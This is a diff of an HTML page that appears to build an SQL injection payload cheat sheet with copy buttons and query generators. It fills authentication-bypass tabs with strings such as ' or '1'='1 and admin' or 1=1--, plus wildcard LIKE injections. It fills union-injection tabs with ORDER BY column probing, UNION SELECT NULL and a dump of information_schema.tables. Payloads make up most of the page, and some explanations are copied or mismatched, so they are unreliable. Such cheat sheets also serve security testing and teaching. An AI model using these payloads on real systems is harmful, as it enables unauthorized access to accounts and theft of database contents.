@@ -33,7 +33,7 @@
 
       <!-- Dark/Light Mode -->
       <div>
-        <button class="fa-solid dark-mode-button" id="Switch-Color"> Dark Mode</button>
+        <button class="fa-solid dark-mode-button" id="Switch-Color"> 🌙 Dark Mode</button>
       </div>
       <!-- Dark/Light Mode end -->
 
@@ -44,7 +44,7 @@
         <div class="tab">
           <button class="tablinks" onclick="ChangeTab(event, 'Authentication-Bypass')" id="AuthenticationBypassOpen">
             Authentication Bypass </button>
-          <button class="tablinks" onclick="ChangeTab(event, 'Blind-Injections')" id="BlindInjectionOpen"> Blind
+          <button class="tablinks" onclick="ChangeTab(event, 'Union-Injections')" id="UnionInjectionOpen"> Union
             Injections </button>
         </div>
         <!--Tab links end -->
@@ -57,107 +57,945 @@
             <div class="tabs scroll">
               <div class="tab active">Always True Auth</div>
               <div class="tab">Empty String Auth</div>
-              <div class="tab">Tab 3</div>
-              <div class="tab">Tab 4</div>
+              <div class="tab">Admin Auth</div>
+              <div class="tab">Null Byte Auth</div>
+              <div class="tab">Comment Auth</div>
+              <div class="tab">Char Auth</div>
+              <div class="tab">Number Auth</div>
+              <div class="tab">True Condition Auth</div>
+              <div class="tab">False Admin Auth</div>
+              <div class="tab">Admin Auth 2</div>
+              <div class="tab">Admin Auth 3</div>
+              <div class="tab">Admin Auth 4</div>
+              <div class="tab">Always True Auth 2</div>
+              <div class="tab">Always True Auth 3</div>
+              <div class="tab">Always True Auth 4</div>
+              <div class="tab">Wildcard UID Injection</div>
+              <div class="tab">Wildcard Uname Injection</div>
+              <div class="tab">Wildcard Userid Injection</div>
+              <div class="tab">Wildcard User Injection</div>
+              <div class="tab">Custom Wildcard Injection</div>
+
             </div>
 
             <div class="content-container">
               <div class="content active">
                 <h3>Always True Auth</h3>
-                <p>
-                  Lorem ipsum dolor sit amet consectetur adipisicing elit. Nisi sed
-                  iure perferendis deleniti possimus consequatur ducimus officia sunt
-                  minima amet!
-                </p>
+                <div class="input-group">
+                  <span class="input-group-text">Query:</span>
+                  <div class="form-floating">
+                    <input type="text" class="form-control-plaintext" id="Bypass-Query-1" value="' or '1'='1"
+                      readonly />
+                    <label for="Bypass-Query-1">SQL</label>
+                  </div>
+                  <div class="copy">
+                    <button class="btn btn-outline-secondary light" type="button" id="Copy" data-id="Bypass-Query-1">
+                      <span class="copytext">Copy to clipboard</span> Copy Text </button>
+                  </div>
+                </div>
+                <div class="explanation">
+                  <p><strong>' : </strong>The initial single quote closes the string that was started by the query
+                    itself.</br></br>
+                    <strong> or : </strong>This introduces a logical OR condition, meaning that if either the condition
+                    before or after the OR is true, the overall condition will be considered true.</br></br>
+                    <strong>'1'='1' : </strong>This condition is always true, because it compares the string '1' to
+                    itself.
+                  </p>
+                </div>
               </div>
-
               <div class="content">
                 <h3>Empty String Auth</h3>
-                <p>
-                  Lorem ipsum dolor sit amet consectetur adipisicing elit. Nisi sed
-                  iure perferendis deleniti possimus consequatur ducimus officia sunt
-                  minima amet!
-                </p>
-                <p>
-                  Lorem ipsum dolor sit amet consectetur adipisicing elit. Facilis
-                  deserunt consequuntur unde aperiam deleniti amet.
-                </p>
+                <div class="input-group">
+                  <span class="input-group-text">Query:</span>
+                  <div class="form-floating">
+                    <input type="text" class="form-control-plaintext" id="Bypass-Query-2" value="' or ''='" readonly />
+                    <label for="Bypass-Query-2">SQL</label>
+                  </div>
+                  <div class="copy">
+                    <button class="btn btn-outline-secondary light" type="button" id="Copy" data-id="Bypass-Query-2">
+                      <span class="copytext">Copy to clipboard</span> Copy Text </button>
+                  </div>
+                </div>
+                <div class="explanation">
+                  <p><strong>' : </strong>The initial single quote closes the string that was started by the query
+                    itself.</br></br>
+                    <strong>or : </strong>This introduces a logical OR condition, meaning that if either the condition
+                    before or after the OR is true, the overall condition will be considered true.</br></br>
+                    <strong>'1'='1' : </strong>This condition is always true, because it compares the string '1' to
+                    itself.
+                </div>
               </div>
 
               <div class="content">
-                <h3>Heading 3</h3>
-                <p>
-                  Lorem ipsum dolor sit amet consectetur adipisicing elit. Facilis
-                  deserunt consequuntur unde aperiam deleniti amet.
-                </p>
-                <p>
-                  Lorem ipsum dolor sit amet consectetur adipisicing elit. Nisi sed
-                  iure perferendis deleniti possimus consequatur ducimus officia sunt
-                  minima amet!
-                </p>
+                <h3>Admin Auth</h3>
+                <div class="input-group">
+                  <span class="input-group-text">Query:</span>
+                  <div class="form-floating">
+                    <input type="text" class="form-control-plaintext" id="Bypass-Query-3" value="admin' or '"
+                      readonly />
+                    <label for="Bypass-Query-3">SQL</label>
+                  </div>
+                  <div class="copy">
+                    <button class="btn btn-outline-secondary light" type="button" id="Copy" data-id="Bypass-Query-3">
+                      <span class="copytext">Copy to clipboard</span> Copy Text </button>
+                  </div>
+                </div>
+                <div class="explanation">
+                  <p><strong>' :</strong> The initial single quote closes the string that might represent a username or
+                    identifier in the query.</br></br>
+                    <strong>or : </strong> This introduces a logical OR condition, extending the possibilities for the
+                    query to evaluate true conditions.</br></br>
+                    <strong>' :</strong> The final single quote closes the string, completing the injection attempt.
+                  </p>
+                </div>
+              </div>
+
+
+              <div class="content">
+                <h3>Null Byte Auth</h3>
+                <div class="input-group">
+                  <span class="input-group-text">Query:</span>
+                  <div class="form-floating">
+                    <input type="text" class="form-control-plaintext" id="Bypass-Query-4" value="' or 1]%00" readonly />
+                    <label for="Bypass-Query-4">SQL</label>
+                  </div>
+                  <div class="copy">
+                    <button class="btn btn-outline-secondary light" type="button" id="Copy" data-id="Bypass-Query-4">
+                      <span class="copytext">Copy to clipboard</span> Copy Text </button>
+                  </div>
+                </div>
+                <div class="explanation">
+                  <p><strong>' :</strong> The initial single quote closes the string that might represent a username or
+                    identifier in the query.</br></br>
+                    <strong>or :</strong> This introduces a logical OR condition, which means that if either the
+                    condition before or after the OR is true, the overall condition will be considered true.</br></br>
+                    <strong>1] :</strong> This is a malformed condition that may attempt to bypass input validation or
+                    filtering mechanisms.</br></br>
+                    <strong>%00 :</strong> This is a null byte (%00) or a null terminator. It can be used to terminate
+                    the string in the SQL query, effectively ignoring any characters that may follow it.
+                  </p>
+                </div>
               </div>
 
               <div class="content">
-                <h3>Heading 4</h3>
-                <p>
-                  Lorem ipsum dolor sit amet consectetur adipisicing elit. Nisi sed
-                  iure perferendis deleniti possimus consequatur ducimus officia sunt
-                  minima amet!
-                </p>
+                <h3>Comment Auth</h3>
+                <div class="input-group">
+                  <span class="input-group-text">Query:</span>
+                  <div class="form-floating">
+                    <input type="text" class="form-control-plaintext" id="Bypass-Query-5" value="' or /* or '"
+                      readonly />
+                    <label for="Bypass-Query-5">SQL</label>
+                  </div>
+                  <div class="copy">
+                    <button class="btn btn-outline-secondary light" type="button" id="Copy" data-id="Bypass-Query-5">
+                      <span class="copytext">Copy to clipboard</span> Copy Text </button>
+                  </div>
+                </div>
+                <div class="explanation">
+                  <p><strong>' :</strong> The initial single quote closes the string that might represent a username or
+                    identifier in the query.</br></br>
+                    <strong>or : </strong> This introduces a logical OR condition, which means that if either the
+                    condition before or after the OR is true, the overall condition will be considered true.</br></br>
+                    <strong>/* : </strong> Denotes the start of a comment in SQL, which can be used to ignore the rest
+                    of the query.</br></br>
+                    <strong>or ' : </strong> Another instance of the logical OR condition, which can lead to unexpected
+                    behavior in the query.
+                  </p>
+                </div>
               </div>
+
+              <div class="content">
+                <h3>Char Auth</h3>
+                <div class="input-group">
+                  <span class="input-group-text">Query:</span>
+                  <div class="form-floating">
+                    <input type="text" class="form-control-plaintext" id="Bypass-Query-6"
+                      value="' or &quot;a&quot; or '" readonly />
+                    <label for="Bypass-Query-6">SQL</label>
+                  </div>
+                  <div class="copy">
+                    <button class="btn btn-outline-secondary light" type="button" id="Copy" data-id="Bypass-Query-6">
+                      <span class="copytext">Copy to clipboard</span> Copy Text </button>
+                  </div>
+                </div>
+                <div class="explanation">
+                  <p><strong>' :</strong> The initial single quote closes the string that might represent a username or
+                    identifier in the query.</br></br>
+                    <strong>or : </strong> This introduces a logical OR condition, which means that if either the
+                    condition before or after the OR is true, the overall condition will be considered true.</br></br>
+                    <strong>"a" : </strong> Represents a string comparison where the letter 'a' is compared for
+                    equality, which can lead to unexpected behavior in the query.</br></br>
+                    <strong>or : </strong> This introduces another logical OR condition, extending the possibilities for
+                    the query to evaluate true conditions.</br></br>
+                    <strong>' :</strong> The final single quote closes the string, completing the injection attempt.
+                  </p>
+                </div>
+              </div>
+
+              <div class="content">
+                <h3>Number Auth</h3>
+                <div class="input-group">
+                  <span class="input-group-text">Query:</span>
+                  <div class="form-floating">
+                    <input type="text" class="form-control-plaintext" id="Bypass-Query-7" value="' or 1 or '"
+                      readonly />
+                    <label for="Bypass-Query-7">SQL</label>
+                  </div>
+                  <div class="copy">
+                    <button class="btn btn-outline-secondary light" type="button" id="Copy" data-id="Bypass-Query-7">
+                      <span class="copytext">Copy to clipboard</span> Copy Text </button>
+                  </div>
+                </div>
+                <div class="explanation">
+                  <p><strong>' :</strong> The initial single quote closes the string that might represent a username or
+                    identifier in the query.</br></br>
+                    <strong>or : </strong> This introduces a logical OR condition, which means that if either the
+                    condition before or after the OR is true, the overall condition will be considered true.</br></br>
+                    <strong>1 : </strong> Represents the integer value 1, which is commonly used in SQL injection
+                    attempts to create a true condition.</br></br>
+                    <strong>or : </strong> This introduces another logical OR condition, extending the possibilities for
+                    the query to evaluate true conditions.</br></br>
+                    <strong>' :</strong> The final single quote closes the string, completing the injection attempt.
+                  </p>
+                </div>
+              </div>
+
+              <div class="content">
+                <h3>True Condition Auth</h3>
+                <div class="input-group">
+                  <span class="input-group-text">Query:</span>
+                  <div class="form-floating">
+                    <input type="text" class="form-control-plaintext" id="Bypass-Query-8" value="' or true() or '"
+                      readonly />
+                    <label for="Bypass-Query-8">SQL</label>
+                  </div>
+                  <div class="copy">
+                    <button class="btn btn-outline-secondary light" type="button" id="Copy" data-id="Bypass-Query-8">
+                      <span class="copytext">Copy to clipboard</span> Copy Text </button>
+                  </div>
+                </div>
+                <div class="explanation">
+                  <p><strong>' :</strong> The initial single quote closes the string that might represent a username or
+                    identifier in the query.</br></br>
+                    <strong>or : </strong> This introduces a logical OR condition, which means that if either the
+                    condition before or after the OR is true, the overall condition will be considered true.</br></br>
+                    <strong>true() : </strong> Represents a true condition in SQL, used to bypass authentication checks
+                    or access secured data.</br></br>
+                    <strong>or : </strong> This introduces another logical OR condition, extending the possibilities for
+                    the query to evaluate true conditions.</br></br>
+                    <strong>' :</strong> The final single quote closes the string and completes the injection attempt.
+                  </p>
+                </div>
+              </div>
+
+              <div class="content">
+                <h3>False Admin Auth</h3>
+                <div class="input-group">
+                  <span class="input-group-text">Query:</span>
+                  <div class="form-floating">
+                    <input type="text" class="form-control-plaintext" id="Bypass-Query-9" value="admin' or '1'='2"
+                      readonly />
+                    <label for="Bypass-Query-9">SQL</label>
+                  </div>
+                  <div class="copy">
+                    <button class="btn btn-outline-secondary light" type="button" id="Copy" data-id="Bypass-Query-9">
+                      <span class="copytext">Copy to clipboard</span> Copy Text </button>
+                  </div>
+                </div>
+                <div class="explanation">
+                  <p><strong>' :</strong> The initial single quote closes the string that might represent a username or
+                    identifier in the query.</br></br>
+                    <strong>or : </strong> This introduces a logical OR condition, which means that if either the
+                    condition before or after the OR is true, the overall condition will be considered true.</br></br>
+                    <strong>'1'='2 : </strong> This condition is always false, because it compares the string '1' to
+                    '2', resulting in a false condition.</br></br>
+                    <strong>admin' :</strong> The final single quote closes the string, completing the injection
+                    attempt.
+                  </p>
+                </div>
+              </div>
+
+              <div class="content">
+                <h3>Admin Auth 2</h3>
+                <div class="input-group">
+                  <span class="input-group-text">Query:</span>
+                  <div class="form-floating">
+                    <input type="text" class="form-control-plaintext" id="Bypass-Query-9" value="admin' or 1=1--"
+                      readonly />
+                    <label for="Bypass-Query-9">SQL</label>
+                  </div>
+                  <div class="copy">
+                    <button class="btn btn-outline-secondary light" type="button" id="Copy" data-id="Bypass-Query-9">
+                      <span class="copytext">Copy to clipboard</span> Copy Text </button>
+                  </div>
+                </div>
+                <div class="explanation">
+                  <p><strong>' :</strong> The initial single quote closes the string that might represent a username or
+                    identifier in the query.</br></br>
+                    <strong>or : </strong> This introduces a logical OR condition, which means that if either the
+                    condition before or after the OR is true, the overall condition will be considered true.</br></br>
+                    <strong>1=1 : </strong> This condition is always true, because it compares the number 1 to itself,
+                    resulting in a true condition.</br></br>
+                    <strong>-- : </strong> Denotes a comment in SQL, used to ignore the rest of the query.
+                  </p>
+                </div>
+              </div>
+
+              <div class="content">
+                <h3>Admin Auth 3</h3>
+                <div class="input-group">
+                  <span class="input-group-text">Query:</span>
+                  <div class="form-floating">
+                    <input type="text" class="form-control-plaintext" id="Bypass-Query-9" value='admin" or "1"="1"#'
+                      readonly />
+                    <label for="Bypass-Query-9">SQL</label>
+                  </div>
+                  <div class="copy">
+                    <button class="btn btn-outline-secondary light" type="button" id="Copy" data-id="Bypass-Query-9">
+                      <span class="copytext">Copy to clipboard</span> Copy Text </button>
+                  </div>
+                </div>
+                <div class="explanation">
+                  <p><strong>' :</strong> The initial single quote closes the string that might represent a username or
+                    identifier in the query.</br></br>
+                    <strong>or : </strong> This introduces a logical OR condition, which means that if either the
+                    condition before or after the OR is true, the overall condition will be considered true.</br></br>
+                    <strong>"1"="1" : </strong> This condition is always true, because it compares the string "1" to
+                    itself, resulting in a true condition.</br></br>
+                    <strong># : </strong> Denotes a comment in SQL, used to ignore the rest of the query. (# symbol is
+                    used for single line commet in MySQL)
+                  </p>
+                </div>
+              </div>
+
+
+              <div class="content">
+                <h3>Admin Auth 4</h3>
+                <div class="input-group">
+                  <span class="input-group-text">Query:</span>
+                  <div class="form-floating">
+                    <input type="text" class="form-control-plaintext" id="Bypass-Query-10" value='"admin" or "1"="1"/*'
+                      readonly />
+                    <label for="Bypass-Query-10">SQL</label>
+                  </div>
+                  <div class="copy">
+                    <button class="btn btn-outline-secondary light" type="button" id="Copy" data-id="Bypass-Query-10">
+                      <span class="copytext">Copy to clipboard</span> Copy Text </button>
+                  </div>
+                </div>
+                <div class="explanation">
+                  <p><strong>' :</strong> The initial double quote closes the string that might represent a username or
+                    identifier in the query.</br></br>
+                    <strong>or : </strong> This introduces a logical OR condition, which means that if either the
+                    condition before or after the OR is true, the overall condition will be considered true.</br></br>
+                    <strong>"1"="1" : </strong> This condition is always true, because it compares the string "1" to
+                    itself, resulting in a true condition.</br></br>
+                    <strong>/* : </strong> Denotes a comment in SQL, used to ignore the rest of the query, including
+                    subsequent lines as it is a multi line comment.
+                  </p>
+                </div>
+              </div>
+
+              <div class="content">
+                <h3>Always True Auth 3</h3>
+                <div class="input-group">
+                  <span class="input-group-text">Query:</span>
+                  <div class="form-floating">
+                    <input type="text" class="form-control-plaintext" id="Bypass-Query-11" value="'or 1=1#" readonly />
+                    <label for="Bypass-Query-11">SQL</label>
+                  </div>
+                  <div class="copy">
+                    <button class="btn btn-outline-secondary light" type="button" id="Copy" data-id="Bypass-Query-11">
+                      <span class="copytext">Copy to clipboard</span> Copy Text </button>
+                  </div>
+                </div>
+                <div class="explanation">
+                  <p><strong>' :</strong> The initial single quote closes the string that might represent a username or
+                    identifier in the query.</br></br>
+                    <strong>or : </strong> This introduces a logical OR condition, which means that if either the
+                    condition before or after the OR is true, the overall condition will be considered true.</br></br>
+                    <strong>1=1 : </strong> This condition is always true, because it compares the number 1 to itself,
+                    resulting in a true condition.</br></br>
+                    <strong># : </strong> Denotes a comment in SQL, used to ignore the rest of the query.
+                  </p>
+                </div>
+              </div>
+
+              <div class="content">
+                <h3>Always True Auth 3</h3>
+                <div class="input-group">
+                  <span class="input-group-text">Query:</span>
+                  <div class="form-floating">
+                    <input type="text" class="form-control-plaintext" id="Bypass-Query-12" value="' or '1'='1'--"
+                      readonly />
+                    <label for="Bypass-Query-12">SQL</label>
+                  </div>
+                  <div class="copy">
+                    <button class="btn btn-outline-secondary light" type="button" id="Copy" data-id="Bypass-Query-12">
+                      <span class="copytext">Copy to clipboard</span> Copy Text </button>
+                  </div>
+                </div>
+                <div class="explanation">
+                  <p><strong>' :</strong> The initial single quote closes the string that might represent a username or
+                    identifier in the query.</br></br>
+                    <strong>or : </strong> This introduces a logical OR condition, which means that if either the
+                    condition before or after the OR is true, the overall condition will be considered true.</br></br>
+                    <strong>'1'='1'-- :</strong> This condition is always true, because it compares the string '1' to
+                    itself, resulting in a true condition.</br></br>
+                    <strong>-- : </strong> Denotes a comment in SQL, used to ignore the rest of the query.
+                  </p>
+                </div>
+              </div>
+
+              <div class="content">
+                <h3>Always True Auth 4</h3>
+                <div class="input-group">
+                  <span class="input-group-text">Query:</span>
+                  <div class="form-floating">
+                    <input type="text" class="form-control-plaintext" id="Bypass-Query-13" value="' or '1'='1'/*"
+                      readonly />
+                    <label for="Bypass-Query-13">SQL</label>
+                  </div>
+                  <div class="copy">
+                    <button class="btn btn-outline-secondary light" type="button" id="Copy" data-id="Bypass-Query-13">
+                      <span class="copytext">Copy to clipboard</span> Copy Text </button>
+                  </div>
+                </div>
+                <div class="explanation">
+                  <p><strong>' :</strong> The initial single quote closes the string that might represent a username or
+                    identifier in the query.</br></br>
+                    <strong>or : </strong> This introduces a logical OR condition, which means that if either the
+                    condition before or after the OR is true, the overall condition will be considered true.</br></br>
+                    <strong>'1'='1'/* :</strong> This condition is always true, because it compares the string '1' to
+                    itself, resulting in a true condition.</br></br>
+                    <strong>/* : </strong> Denotes a comment in SQL, used to ignore the rest of the query.
+                  </p>
+                </div>
+              </div>
+
+              <div class="content">
+                <h3>Wildcard UID Injection</h3>
+                <div class="input-group">
+                  <span class="input-group-text">Query:</span>
+                  <div class="form-floating">
+                    <input type="text" class="form-control-plaintext" id="Bypass-Query-14" value="' or uid like '%'"
+                      readonly />
+                    <label for="Bypass-Query-14">SQL</label>
+                  </div>
+                  <div class="copy">
+                    <button class="btn btn-outline-secondary light" type="button" id="Copy" data-id="Bypass-Query-14">
+                      <span class="copytext">Copy to clipboard</span> Copy Text </button>
+                  </div>
+                </div>
+                <div class="explanation">
+                  <p><strong>' :</strong> The initial single quote closes the string that might represent a username or
+                    identifier in the query.</br></br>
+                    <strong>or : </strong> This introduces a logical OR condition, which means that if either the
+                    condition before or after the OR is true, the overall condition will be considered true.</br></br>
+                    <strong>uid like '%' :</strong> This condition is attempting to match any value in the 'uid' column
+                    because '%' is a wildcard character in SQL that matches any sequence of characters.
+                  </p>
+                </div>
+              </div>
+
+              <div class="content">
+                <h3>Wildcard Uname Injection</h3>
+                <div class="input-group">
+                  <span class="input-group-text">Query:</span>
+                  <div class="form-floating">
+                    <input type="text" class="form-control-plaintext" id="Bypass-Query-15" value="' or uname like '%'"
+                      readonly />
+                    <label for="Bypass-Query-15">SQL</label>
+                  </div>
+                  <div class="copy">
+                    <button class="btn btn-outline-secondary light" type="button" id="Copy" data-id="Bypass-Query-15">
+                      <span class="copytext">Copy to clipboard</span> Copy Text </button>
+                  </div>
+                </div>
+                <div class="explanation">
+                  <p><strong>' :</strong> The initial single quote closes the string that might represent a username or
+                    identifier in the query.</br></br>
+                    <strong>or : </strong> This introduces a logical OR condition, which means that if either the
+                    condition before or after the OR is true, the overall condition will be considered true.</br></br>
+                    <strong>uname like '%' :</strong> This condition is attempting to match any value in the 'uname'
+                    column because '%' is a wildcard character in SQL that matches any sequence of characters.
+                  </p>
+                </div>
+              </div>
+
+              <div class="content">
+                <h3>Wildcard Userid Injection</h3>
+                <div class="input-group">
+                  <span class="input-group-text">Query:</span>
+                  <div class="form-floating">
+                    <input type="text" class="form-control-plaintext" id="Bypass-Query-16" value="' or userid like '%'"
+                      readonly />
+                    <label for="Bypass-Query-16">SQL</label>
+                  </div>
+                  <div class="copy">
+                    <button class="btn btn-outline-secondary light" type="button" id="Copy" data-id="Bypass-Query-16">
+                      <span class="copytext">Copy to clipboard</span> Copy Text </button>
+                  </div>
+                </div>
+                <div class="explanation">
+                  <p><strong>' :</strong> The initial single quote closes the string that might represent a username or
+                    identifier in the query.</br></br>
+                    <strong>or : </strong> This introduces a logical OR condition, which means that if either the
+                    condition before or after the OR is true, the overall condition will be considered true.</br></br>
+                    <strong>userid like '%' :</strong> This condition is attempting to match any value in the 'userid'
+                    column because '%' is a wildcard character in SQL that matches any sequence of characters.
+                  </p>
+                </div>
+              </div>
+
+              <div class="content">
+                <h3>Wildcard User Injection</h3>
+                <div class="input-group">
+                  <span class="input-group-text">Query:</span>
+                  <div class="form-floating">
+                    <input type="text" class="form-control-plaintext" id="Bypass-Query-17" value="' or user like '%'"
+                      readonly />
+                    <label for="Bypass-Query-17">SQL</label>
+                  </div>
+                  <div class="copy">
+                    <button class="btn btn-outline-secondary light" type="button" id="Copy" data-id="Bypass-Query-17">
+                      <span class="copytext">Copy to clipboard</span> Copy Text </button>
+                  </div>
+                </div>
+                <div class="explanation">
+                  <p><strong>' :</strong> The initial single quote closes the string that might represent a username or
+                    identifier in the query.</br></br>
+                    <strong>or : </strong> This introduces a logical OR condition, which means that if either the
+                    condition before or after the OR is true, the overall condition will be considered true.</br></br>
+                    <strong>user like '%' :</strong> This condition is attempting to match any value in the 'user'
+                    column because '%' is a wildcard character in SQL that matches any sequence of characters.
+                  </p>
+                </div>
+              </div>
+
+              <div class="content">
+                <h3>Wildcard User Injection</h3>
+                <div class="input-group">
+                  <span class="input-group-text">Query:</span>
+                  <div class="form-floating">
+                    <input type="text" class="form-control-plaintext" id="Bypass-Query-18"
+                      value="' or username like '%'" readonly />
+                    <label for="Bypass-Query-18">SQL</label>
+                  </div>
+                  <div class="copy">
+                    <button class="btn btn-outline-secondary light" type="button" id="Copy" data-id="Bypass-Query-18">
+                      <span class="copytext">Copy to clipboard</span> Copy Text </button>
+                  </div>
+                </div>
+                <div class="input-group mt-3">
+                  <label for="Column-Name" class="input-group-text">Enter Column Name:</label>
+                  <input type="text" id="Column-Name" class="form-control" placeholder="e.g., username">
+                  <label for="Wildcard-Value" class="input-group-text">Wildcard Value:</label>
+                  <input type="text" id="Wildcard-Value" class="form-control" placeholder="e.g., %">
+                  <button class="btn btn-outline-secondary" type="button" onclick="generateCustomQuery()">Generate
+                    Query</button>
+                </div>
+                <div class="explanation">
+                  <p><strong>' :</strong> The initial single quote closes the string that might represent a username or
+                    identifier in the query.</br></br>
+                    <strong>or : </strong> This introduces a logical OR condition, allowing multiple conditions to be
+                    evaluated, where if any condition is true, the overall condition becomes true.</br></br>
+                    <strong>Column Name + LIKE + Wildcard Value :</strong> This condition is designed to search for any
+                    value in the specified column that matches the pattern defined by the wildcard character provided by
+                    the user. The LIKE operator is used for pattern matching, and the wildcard '%' represents any
+                    sequence of characters, making the search broad and flexible.
+                  </p>
+                </div>
+
+              </div>
+
+              <script>
+                function generateCustomQuery() {
+                  var columnName = document.getElementById('Column-Name').value.trim();
+                  var wildcardValue = document.getElementById('Wildcard-Value').value.trim();
+
+                  if (columnName === '' || wildcardValue === '') {
+                    alert('Please enter both the column name and wildcard value.');
+                    return;
+                  }
+
+                  var customQuery = "' or " + columnName + " like '%" + wildcardValue + "'";
+                  document.getElementById('Bypass-Query-18').value = customQuery;
+
+                  // Show the explanation
+                  document.querySelector('.explanation').style.display = 'block';
+                }
+              </script>
+
             </div>
           </div>
         </div>
 
-        <div id="Blind-Injections" class="tabcontent">
-          <h3>Authentication Bypass</h3>
+        <div id="Union-Injections" class="tabcontent">
+          <h3>Union Injections</h3>
           <div class="tabs-container">
             <div class="tabs scroll">
-              <div class="tab active">Tab 1</div>
-              <div class="tab">Tab 2</div>
-              <div class="tab">Tab 3</div>
-              <div class="tab">Tab 4</div>
+              <div class="tab active">Order By</div>
+              <div class="tab">Union Select Null</div>
+              <div class="tab">Union Dump Information Schema</div>
+              <div class="tab">Union Dump Table Names</div>
+              <div class="tab">Union Dump Column Names</div>
+              <div class="tab">Union Exfiltrate 1</div>
             </div>
 
             <div class="content-container">
-              <div class="content active">
-                <h3>Heading 1</h3>
-                <p>
-                  Lorem ipsum dolor sit amet consectetur adipisicing elit. Nisi sed
-                  iure perferendis deleniti possimus consequatur ducimus officia sunt
-                  minima amet!
-                </p>
-                <p>
-                  Lorem ipsum dolor sit amet consectetur adipisicing elit. Nisi sed
-                  iure perferendis deleniti possimus consequatur ducimus officia sunt
-                  minima amet!
-                </p>
+              <div class="content">
+                <h3>Order By</h3>
+                <div class="input-group">
+                  <span class="input-group-text">Query:</span>
+                  <div class="form-floating">
+                    <input type="text" class="form-control-plaintext" id="Union-Query-1" value="1' ORDER BY 1--"
+                      readonly />
+                    <label for="Union-Query-1">SQL</label>
+                  </div>
+                  <div class="copy">
+                    <button class="btn btn-outline-secondary light" type="button" id="Copy" data-id="Union-Query-1">
+                      <span class="copytext">Copy to clipboard</span> Copy Text </button>
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="col">
+                    <div class="input-group mt-3">
+                      <label for="OrderBy-Number" class="input-group-text">Order By Number:</label>
+                      <input type="number" id="OrderBy-Number" class="form-control" value="1" min="1">
+                    </div>
+                  </div>
+                  <div class="col">
+                    <div class="input-group">
+                      <label for="comment-options-1" class="input-group-text">Comment Type:</label>
+                      <select class="form-control" id="comment-options-1">
+                        <option>--</option>
+                        <option>#</option>
+                        <option>/*</option>
+                      </select>
+                    </div>
+                  </div>
+                  <div>
+                    </br>
+                    <button class="generate-query-btn" type="button" onclick="generateUnionOrderBy()">Generate
+                      Query</button>
+                  </div>
+                </div>
+                <div class="explanation">
+                  <p><strong>1' ORDER BY 1-- :</strong> This query attempts to perform a Union Attack by adding an ORDER
+                    BY clause with the number 1, which is commonly used for testing the vulnerability.</br></br>
+                    The user can input a number to dynamically change the ORDER BY clause in the query, allowing for
+                    potential exploitation of SQL injection vulnerabilities through
+                    Union Attacks.
+                  </p>
+                </div>
+              </div>
+              <script>
+                function generateUnionOrderBy() {
+                  var orderByNumber = document.getElementById('OrderBy-Number').value.trim();
+                  var commentOption = document.getElementById('comment-options-1').value;
+
+                  if (orderByNumber === '') {
+                    alert('Please enter the Order By number.');
+                    return;
+                  }
+
+                  var unionQuery = "1' ORDER BY " + orderByNumber + commentOption;
+                  document.getElementById('Union-Query-1').value = unionQuery;
+
+                  // Show the explanation
+                  document.querySelector('.explanation').style.display = 'block';
+                }
+              </script>
+
+              <div class="content">
+                <h3>Union Select Injection</h3>
+                <div class="input-group">
+                  <span class="input-group-text">Query:</span>
+                  <div class="form-floating">
+                    <input type="text" class="form-control-plaintext" id="Union-Query-2" value="1' UNION SELECT NULL--"
+                      readonly />
+                    <label for="Union-Query-2">SQL</label>
+                  </div>
+                  <div class="copy">
+                    <button class="btn btn-outline-secondary light" type="button" id="Copy" data-id="Union-Query-2">
+                      <span class="copytext">Copy to clipboard</span> Copy Text </button>
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="col">
+                    <div class="input-group mt-3">
+                      <label for="Num-Nulls" class="input-group-text">Number of NULLs:</label>
+                      <input type="number" id="Num-Nulls" class="form-control" value="1" min="1">
+                    </div>
+                  </div>
+                  <div class="col">
+                    <div class="input-group">
+                      <label for="comment-options-1" class="input-group-text">Comment Type:</label>
+                      <select class="form-control" id="comment-options-1">
+                        <option>--</option>
+                        <option>#</option>
+                        <option>/*</option>
+                      </select>
+                    </div>
+                  </div>
+                  <div>
+                    </br>
+                    <button class="generate-query-btn" type="button" onclick="generateUnionSelectNull()">Generate
+                      Query</button>
+                  </div>
+                </div>
+                <div class="explanation">
+                  <p><strong>1' UNION SELECT null-- :</strong> This query attempts to perform a Union Select Null
+                    Injection by
+                    appending a UNION SELECT statement with the specified number of NULL values, which is commonly
+                    used to determine
+                    the number of columns in a SQL injection vulnerability.</br></br>
+                    The user can input the number of NULL values to be included in the UNION SELECT statement,
+                    allowing for
+                    customization of the injection query for column enumeration.
+                  </p>
+                </div>
               </div>
 
               <div class="content">
-                <h3>Heading 2</h3>
-                <p>
-                  Lorem ipsum dolor sit amet consectetur adipisicing elit. Nisi sed
-                  iure perferendis deleniti possimus consequatur ducimus officia sunt
-                  minima amet!
-                </p>
-                <p>
-                  Lorem ipsum dolor sit amet consectetur adipisicing elit. Facilis
-                  deserunt consequuntur unde aperiam deleniti amet.
-                </p>
+                <h3>Union Dump Information Schema</h3>
+                <div class="input-group">
+                  <span class="input-group-text">Query:</span>
+                  <div class="form-floating">
+                    <input type="text" class="form-control-plaintext" id="Union-Query-4"
+                      value="1' UNION SELECT * FROM information_schema.tables--" readonly />
+                    <label for="Union-Query-4">SQL</label>
+                  </div>
+                  <div class="copy">
+                    <button class="btn btn-outline-secondary light" type="button" id="Copy" data-id="Union-Query-4">
+                      <span class="copytext">Copy to clipboard</span> Copy Text
+                    </button>
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="col">
+                    <div class="input-group mt-3">
+                      <label for="comment-options-4" class="input-group-text">Comment Type:</label>
+                      <select class="form-control" id="comment-options-4">
+                        <option>--</option>
+                        <option>#</option>
+                        <option>/*</option>
+                      </select>
+                    </div>
+                  </div>
+                  <div>
+                    <br>
+                    <button class="generate-query-btn" type="button"
+                      onclick="generateUnionDumpInformationSchema()">Generate Query</button>
+                  </div>
+                </div>
+                <div class="explanation">
+                  <p><strong>1' UNION SELECT * FROM information_schema.tables-- :</strong> This query attempts to
+                    perform a
+                    Union Select Injection by appending a UNION SELECT statement to retrieve all columns from the
+                    'information_schema.tables' table, which contains metadata about database tables.</br></br>
+                    The user can select a comment type to be appended to the injection query, allowing for customization
+                    based on the SQL dialect being targeted.
+                  </p>
+                </div>
+              </div>
+
+              <script>
+                function generateUnionDumpInformationSchema() {
+                  var commentOption = document.getElementById('comment-options-4').value;
+
+                  var unionQuery = "1' UNION SELECT * FROM information_schema.tables" + commentOption;
+                  document.getElementById('Union-Query-4').value = unionQuery;
+
